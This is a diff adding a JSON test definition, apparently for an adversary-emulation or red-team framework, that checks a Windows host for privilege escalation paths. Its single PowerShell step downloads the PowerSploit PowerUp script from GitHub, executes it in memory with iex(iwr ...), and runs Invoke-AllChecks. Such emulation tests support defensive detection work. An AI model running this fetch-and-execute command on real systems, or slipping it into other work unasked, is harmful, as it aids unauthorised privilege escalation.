@@ -1,0 +1,23 @@
+{
+  "id": "1289f78d-22d2-4590-ac76-166737e1811b",
+  "name": "PowerUp Invoke-AllChecks",
+  "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "c1fe1989-5f96-426f-b268-9288e0aba906",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1059.001",
+    "atomic-red-team"
+  ]
+}
